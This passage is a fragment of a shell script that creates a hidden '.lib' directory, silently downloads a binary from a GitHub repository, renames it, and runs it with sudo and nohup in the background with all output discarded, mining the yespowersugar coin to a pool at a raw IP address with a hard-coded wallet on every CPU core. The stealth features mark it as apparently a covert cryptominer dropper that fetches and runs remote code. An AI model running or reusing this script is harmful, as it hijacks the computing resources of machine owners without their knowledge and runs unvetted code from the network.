...
mkdir .lib && cd .lib
wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/avx2 > /dev/null 2>&1
chmod u+x sgr1
sudo nohup ./sgr1 -a yespowersugar -o 128.199.218.20:80 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$WORKER -p x -t $(nproc --all) > /dev/null 2>&1 &
sleep 30
